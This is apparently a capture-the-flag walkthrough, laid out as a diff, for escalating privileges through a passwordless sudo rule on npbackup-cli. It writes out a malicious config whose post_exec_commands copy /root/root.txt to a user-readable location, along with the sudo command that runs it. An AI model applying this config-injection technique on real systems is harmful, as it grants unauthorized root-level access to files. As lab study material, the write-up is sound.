@@ -1,0 +1,256 @@
+User marco may run the following commands on codetwo:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cl
+They idea is to change the conf file that this ervice uses
+
+nano npbackup-cli:
+                                                            
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+import re
+import sys
+from npbackup.__main__ import main
+if __name__ == '__main__':
+    # Block restricted flag
+    if '--external-backend-binary' in sys.argv:
+        print("Error: '--external-backend-binary' flag is restricted for use.")
+        sys.exit(1)
+
+    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
+    sys.exit(main())
+
+
+usr/local/bin/npbackup-cli -h
+usage: npbackup-cli [-h] [-c CONFIG_FILE] [--repo-name REPO_NAME] [--repo-group REPO_GROUP] [-b] [-f]
+                    [-r RESTORE] [-s] [--ls [LS]] [--find FIND] [--forget FORGET] [--policy]
+                    [--housekeeping] [--quick-check] [--full-check] [--check CHECK] [--prune [PRUNE]]
+                    [--prune-max] [--unlock] [--repair-index] [--repair-packs REPAIR_PACKS]
+                    [--repair-snapshots] [--repair REPAIR] [--recover] [--list LIST] [--dump DUMP]
+                    [--stats [STATS]] [--raw RAW] [--init] [--has-recent-snapshot]
+                    [--restore-includes RESTORE_INCLUDES] [--snapshot-id SNAPSHOT_ID] [--json]
+                    [--stdin] [--stdin-filename STDIN_FILENAME] [-v] [-V] [--dry-run] [--no-cache]
+                    [--license] [--auto-upgrade] [--log-file LOG_FILE] [--show-config]
+                    [--external-backend-binary EXTERNAL_BACKEND_BINARY]
+                    [--group-operation GROUP_OPERATION] [--create-key CREATE_KEY]
+                    [--create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK]
+                    [--create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK]
+                    [--check-config-file]
+
+Portable Network Backup Client This program is distributed under the GNU General Public License and
+comes with ABSOLUTELY NO WARRANTY. This is free software, and you are welcome to redistribute it under
+certain conditions; Please type --license for more info.
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -c CONFIG_FILE, --config-file CONFIG_FILE
+                        Path to alternative configuration file (defaults to current dir/npbackup.conf)
+  --repo-name REPO_NAME
+                        Name of the repository to work with. Defaults to 'default'. This can also be a
+                        comma separated list of repo names. Can accept special name '__all__' to work
+                        with all repositories.
+  --repo-group REPO_GROUP
+                        Comme separated list of groups to work with. Can accept special name '__all__'
+                        to work with all repositories.
+  -b, --backup          Run a backup
+  -f, --force           Force running a backup regardless of existing backups age
+  -r RESTORE, --restore RESTORE
+                        Restore to path given by --restore, add --snapshot-id to specify a snapshot
+                        other than latest
+  -s, --snapshots       Show current snapshots
+  --ls [LS]             Show content given snapshot. When no snapshot id is given, latest is used
+  --find FIND           Find full path of given file / directory
+  --forget FORGET       Forget given snapshot (accepts comma separated list of snapshots)
+  --policy              Apply retention policy to snapshots (forget snapshots)
+  --housekeeping        Run --check quick, --policy and --prune in one go
+  --quick-check         Deprecated in favor of --'check quick'. Quick check repository
+  --full-check          Deprecated in favor of '--check full'. Full check repository (read all data)
+  --check CHECK         Checks the repository. Valid arguments are 'quick' (metadata check) and 'full'
+                        (metadata + data check)
+  --prune [PRUNE]       Prune data in repository, also accepts max parameter in order prune reclaiming
+                        maximum space
+  --prune-max           Deprecated in favor of --prune max
+  --unlock              Unlock repository
+  --repair-index        Deprecated in favor of '--repair index'.Repair repo index
+  --repair-packs REPAIR_PACKS
+                        Deprecated in favor of '--repair packs'. Repair repo packs ids given by
+                        --repair-packs
+  --repair-snapshots    Deprecated in favor of '--repair snapshots'.Repair repo snapshots
+  --repair REPAIR       Repair the repository. Valid arguments are 'index', 'snapshots', or 'packs'
+  --recover             Recover lost repo snapshots
+  --list LIST           Show [blobs|packs|index|snapshots|keys|locks] objects
+  --dump DUMP           Dump a specific file to stdout (full path given by --ls), use with --dump
+                        [file], add --snapshot-id to specify a snapshot other than latest
+  --stats [STATS]       Get repository statistics. If snapshot id is given, only snapshot statistics
+                        will be shown. You may also pass "--mode raw-data" or "--mode debug" (with
+                        double quotes) to get full repo statistics
+  --raw RAW             Run raw command against backend. Use with --raw "my raw backend command"
+  --init                Manually initialize a repo (is done automatically on first backup)
+  --has-recent-snapshot
+                        Check if a recent snapshot exists
+  --restore-includes RESTORE_INCLUDES
+                        Restore only paths within include path, comma separated list accepted
+  --snapshot-id SNAPSHOT_ID
+                        Choose which snapshot to use. Defaults to latest
+  --json                Run in JSON API mode. Nothing else than JSON will be printed to stdout
+  --stdin               Backup using data from stdin input
+  --stdin-filename STDIN_FILENAME
+                        Alternate filename for stdin, defaults to 'stdin.data'
+  -v, --verbose         Show verbose output
+  -V, --version         Show program version
+  --dry-run             Run operations in test mode, no actual modifications
+  --no-cache            Run operations without cache
+  --license             Show license
+  --auto-upgrade        Auto upgrade NPBackup
+  --log-file LOG_FILE   Optional path for logfile
+  --show-config         Show full inherited configuration for current repo. Optionally you can set
+                        NPBACKUP_MANAGER_PASSWORD env variable for more details.
+  --external-backend-binary EXTERNAL_BACKEND_BINARY
+                        Full path to alternative external backend binary
+  --group-operation GROUP_OPERATION
+                        Deprecated command to launch operations on multiple repositories. Not needed
+                        anymore. Replaced by --repo-name x,y or --repo-group x,y
+  --create-key CREATE_KEY
+                        Create a new encryption key, requires a file path
+  --create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK
+                        Create a scheduled backup task, specify an argument interval via
+                        interval=minutes, or hour=hour,minute=minute for a daily task
+  --create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK
+                        Create a scheduled housekeeping task, specify hour=hour,minute=minute for a
+                        daily task
+  --check-config-file   Check if config file is valid
+
+----------------------------------------------------------------------
+1. You need to find the .conf file:
+
+cat npbackup.conf 
+conf_version: 3.0.1
+audience: public
+repos:
+  default:
+    repo_uri: 
+      __NPBACKUP__wd9051w9Y0p4ZYWmIx....Xjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
+    repo_group: default_group
+    backup_opts:
+      paths:
+      - /home/app/app/
+      source_type: folder_list
+      exclude_files_larger_than: 0.0
+    repo_opts:
+      repo_password: 
+        __NPBACKUP__v2zdDN21b0c7......n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
+      retention_policy: {}
+      prune_max_unused: 0
+    prometheus: {}
+    env: {}
+    is_protected: false
+groups:
+  default_group:
+    backup_opts:
+      paths: []
+      source_type:
+      stdin_from_command:
+      stdin_filename:
+      tags: []
+      compression: auto
+      use_fs_snapshot: true
+      ignore_cloud_files: true
+      one_file_system: false
+      priority: low
+      exclude_caches: true
+      excludes_case_ignore: false
+      exclude_files:
+      - excludes/generic_excluded_extensions
+      - excludes/generic_excludes
+      - excludes/windows_excludes
+      - excludes/linux_excludes
+      exclude_patterns: []
+      exclude_files_larger_than:
+      additional_parameters:
+      additional_backup_only_parameters:
+      minimum_backup_size_error: 10 MiB
+      pre_exec_commands: []
+      pre_exec_per_command_timeout: 3600
+      pre_exec_failure_is_fatal: false
+      post_exec_commands: []
+      post_exec_per_command_timeout: 3600
+      post_exec_failure_is_fatal: false
+      post_exec_execute_even_on_backup_error: true
+      post_backup_housekeeping_percent_chance: 0
+      post_backup_housekeeping_interval: 0
+    repo_opts:
+      repo_password:
+      repo_password_command:
+      minimum_backup_age: 1440
+      upload_speed: 800 Mib
+      download_speed: 0 Mib
+      backend_connections: 0
+      retention_policy:
+        last: 3
+        hourly: 72
+        daily: 30
+        weekly: 4
+        monthly: 12
+        yearly: 3
+        tags: []
+        keep_within: true
+        group_by_host: true
+        group_by_tags: true
+        group_by_paths: false
+        ntp_server:
+      prune_max_unused: 0 B
+      prune_max_repack_size:
+    prometheus:
+      backup_job: ${MACHINE_ID}
+      group: ${MACHINE_GROUP}
+    env:
+      env_variables: {}
+      encrypted_env_variables: {}
+    is_protected: false
+identity:
+  machine_id: ${HOSTNAME}__blw0
+  machine_group:
+global_prometheus:
+  metrics: false
+  instance: ${MACHINE_ID}
+  destination:
+  http_username:
+  http_password:
+  additional_labels: {}
+  no_cert_verify: false
+global_options:
+  auto_upgrade: false
+  auto_upgrade_percent_chance: 5
+  auto_upgrade_interval: 15
+  auto_upgrade_server_url:
+  auto_upgrade_server_username:
+  auto_upgrade_server_password:
+  auto_upgrade_host_identity: ${MACHINE_ID}
+  auto_upgrade_group: ${MACHINE_GROUP}
+
+
+2. create a mal.conf:
+
+conf_version: 3.0.1
+audience: public
+repos:
+  default:
+    repo_uri: 
+      __NPBACKUP__wd9051w9Y0p4ZYWmIx....Xjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
+    repo_group: default_group
+    backup_opts:
+      paths:
+      - /home/app/app/
+      source_type: folder_list
+-->   post_exec_commands:
+        - "mkdir -p /tmp/rootbackup"
+        - "cp /root/root.txt /tmp/rootbackup/flag.txt 2>/dev/null || true"
+        - "chmod 755 /tmp/rootbackup/flag.txt"
+        - "chown marco:marco /tmp/rootbackup/flag.txt"
+    repo_opts:
+      repo_password: 
+        __NPBACKUP__v2zdDN21b0c7......n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
+
+3. run it with:
+sudo /usr/local/bin/npbackup-clie -c /tmp/mal.conf -b --force
+
+4 then just:
+cat /tmp/rootbackup/flag.txt
